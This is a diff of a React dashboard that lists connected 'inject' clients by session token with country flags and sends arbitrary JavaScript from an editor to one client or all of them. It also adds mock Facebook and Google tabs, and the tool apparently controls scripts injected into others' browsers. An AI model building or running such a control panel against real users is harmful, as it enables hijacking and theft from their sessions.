@@ -59,6 +59,7 @@ import Dialog, {
 	DialogTitle,
 } from 'material-ui/Dialog';
 import Table, { TableBody, TableCell, TableHead, TableRow } from 'material-ui/Table';
+import ChromeTabs from './ChromeTabs';
 
 let drawerWidth = 240
 let dark = false
@@ -436,7 +437,7 @@ class PersistentDrawer extends Component {
     })
 
     socket.on(`inject:clients`, data => {
-      let { event, client, clients, project } = data
+      let { event, session, clients, project } = data
       if (event == 'list') {
         this.setState({ 
           inject: {
@@ -446,22 +447,37 @@ class PersistentDrawer extends Component {
         })
       } else if (this.state.currentProject && project === this.state.currentProject.name) {
         if (event == 'connect') {
+          let sessions = this.state.inject.clients
+          sessions[session.token] = session.data
           this.setState({ 
             inject: {
               ...this.state.inject,
-              clients: this.state.inject.clients.concat(client)
+              clients: sessions
             }
           })
         }
 
         if (event == 'disconnect') {
-          let clients = this.state.inject.clients
-          this.setState({ 
-            inject: {
-              ...this.state.inject,
-              clients: this.state.inject.clients.filter(c => c.id !== client.id)
+          let sessions = this.state.inject.clients
+          if (sessions[session.token]) {
+            if (sessions[session.token].sessions.length === 1) {
+              /**
+               * Remove entire client object
+               */
+              delete sessions[session.token]
+            } else {
+              /**
+               * Filter client
+               */
+              sessions[session.token].sessions = sessions[session.token].sessions.filter(c => c.id !== session.id)
             }
-          })
+            this.setState({ 
+              inject: {
+                ...this.state.inject,
+                clients: sessions
+              }
+            })
+          }
         }
       }
       console.log("%c[websocket] " + "%cinject:clients =>", "color: #ef5350", "color:  #FF9800", data)
@@ -1543,13 +1559,27 @@ class Inject extends Component {
     })
   }
 
-  execute = (id) => {
+  execute = (token, id) => {
     let { socket } = this.props
-    socket.emit('inject:execute', {
-      project: this.props.project,
-      id: id,
-      script: this.state.code,
-    })
+    if (token === '*') {
+      socket.emit('inject:execute', {
+        project: this.props.project,
+        recursive: true,
+        script: this.state.code,
+      })
+    } else {
+      socket.emit('inject:execute', {
+        project: this.props.project,
+        token: token,
+        id: id,
+        script: this.state.code,
+      }) 
+    }
+  }
+
+  switchClient = (token) => {
+    let { socket } = this.props
+    console.log(token)
   }
 
   render() {
@@ -1565,7 +1595,7 @@ class Inject extends Component {
             <Tooltip title="Execute on all clients" placement="right">
               <ComputerIcon onClick={() => this.execute('*')}/>
             </Tooltip>
-            Online clients ({this.state.clients ? this.state.clients.length : 0})
+            Online clients ({this.state.clients ? Object.keys(this.state.clients).length : 0})
           </ListSubheader>
           <LineChart
             axes
@@ -1575,9 +1605,10 @@ class Inject extends Component {
             data={this.state.count}
           />
           <List className={classes.injectList}>
-            {this.state.clients && this.state.clients.map((client, i) => {
+            {this.state.clients && Object.keys(this.state.clients).map((token, i) => {
+              const client = this.state.clients[token]
               return (
-                <ListItem key={i} button dense onClick={() => this.execute(client.id)}>
+                <ListItem key={i} button dense onClick={() => this.switchClient(token)}>
                   <ListItemIcon>
                     <img src={client.images.country} />
                   </ListItemIcon>
@@ -1590,14 +1621,54 @@ class Inject extends Component {
             })}
           </List>
         </div>
-        <MonacoEditor
-          language="javascript"
-          theme="vs-dark"
-          value={code}
-          options={options}
-          onChange={this.onChange}
-          editorDidMount={this.editorDidMount}
-        />
+        <div className="inject-editor-container">
+          <ChromeTabs tabs={[
+            {
+              title: "Facebook",
+              favicon: "https://facebook.com/favicon.ico",
+              active: false
+            },
+            {
+              title: "Google",
+              favicon: "https://google.com/favicon.ico",
+              active: true
+            },
+            {
+              title: "Google",
+              favicon: "https://google.com/favicon.ico",
+              active: false
+            },
+            {
+              title: "Google",
+              favicon: "https://google.com/favicon.ico",
+              active: false
+            },
+            {
+              title: "Google",
+              favicon: "https://google.com/favicon.ico",
+              active: false
+            },
+            {
+              title: "Google",
+              favicon: "https://google.com/favicon.ico",
+              active: false
+            },
+            {
+              title: "Google",
+              favicon: "https://google.com/favicon.ico",
+              active: false
+            }
+          ]}>
+          </ChromeTabs>
+          <MonacoEditor
+            language="javascript"
+            theme="vs-dark"
+            value={code}
+            options={options}
+            onChange={this.onChange}
+            editorDidMount={this.editorDidMount}
+          />
+        </div>
       </div>
     )
   }
